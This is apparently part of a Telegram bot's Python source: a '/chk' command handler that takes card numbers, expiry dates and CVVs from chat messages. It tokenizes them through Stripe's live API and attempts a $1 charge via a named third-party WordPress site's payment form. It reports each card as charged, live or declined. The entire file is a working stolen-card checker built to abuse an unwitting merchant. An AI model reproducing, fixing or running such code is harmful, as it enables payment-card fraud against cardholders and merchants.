@dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
async def ch(message: types.Message):
    await message.answer_chat_action('typing')
    tic = time.perf_counter()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    s = requests.Session()
    try:
        await dp.throttle('chk', rate=ANTISPAM)
    except Throttled:
        await message.reply('<b>Too many requests!</b>\n'
                            f'Blocked For {ANTISPAM} seconds')
    else:
        if message.reply_to_message:
            cc = message.reply_to_message.text
        else:
            cc = message.text[len('/chk '):]

        if len(cc) == 0:
            return await message.reply("<b>No Card to chk</b>")

        x = re.findall(r'\d+', cc)
        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]

        if mm.startswith('2'):
            mm, yy = yy, mm
        if len(mm) >= 3:
            mm, yy, cvv = yy, cvv, mm
        if len(ccn) < 15 or len(ccn) > 16:
            return await message.reply('<b>Failed to parse Card</b>\n'
                                       '<b>Reason: Invalid Format!</b>')   
        BIN = ccn[:6]
        if BIN in BLACKLISTED:
            return await message.reply('<b>BLACKLISTED BIN</b>')
        if await is_card_valid(ccn) != True:
            return await message.reply('<b>Invalid luhn algorithm</b>')

        # BIN Check (e.g., via binlist.net)
        bin_info = bin_check(ccn[:6])

        # Request data to Stripe API
        headers = {
            "user-agent": UA,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded"
        }

        m = s.post('https://m.stripe.com/6', headers=headers)
        r = m.json()
        Guid = r['guid']
        Muid = r['muid']
        Sid = r['sid']

        postdata = {
            "guid": Guid,
            "muid": Muid,
            "sid": Sid,
            "key": "pk_live_Ng5VkKcI3Ur3KZ92goEDVRBq",
            "card[name]": Name,
            "card[number]": ccn,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[cvc]": cvv
        }

        HEADER = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": UA,
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "accept-language": "en-US,en;q=0.9"
        }

        pr = s.post('https://api.stripe.com/v1/tokens',
                    data=postdata, headers=HEADER)
        Id = pr.json()['id']
        if pr.status_code != 200:
            return await message.reply("<b>Site is Dead</b>")
        
        nonce = s.get("https://www.hwstjohn.com/pay-now/")
        form = re.findall(r'formNonce" value="([^\'" >]+)', nonce.text)
        
        load = {
            "action": "wp_full_stripe_payment_charge",
            "formName": "default",
            "formNonce": form,
            "fullstripe_name": Name,
            "fullstripe_email": Email,
            "fullstripe_custom_amount": "1",
            "fullstripe_amount_index": 0,
            "stripeToken": Id
        }

        header = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": UA,
            "accept-language": "en-US,en;q=0.9"
        }

        # POST request to handle the payment processing
        rx = s.post('https://www.hwstjohn.com/wp-admin/admin-ajax.php',
                    data=load, headers=header)
        msg = rx.json()['msg']
        
        toc = time.perf_counter()

        # Handling different response scenarios
        if 'true' in rx.text:
            return await message.reply(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #CHARGED 1$
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {await is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'security code' in rx.text:
            return await message.reply(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #CCN
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {await is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'false' in rx.text:
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #Declined
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {await is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')

        await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ DEAD
<b>MSG</b>➟ {rx.text}
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {await is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')
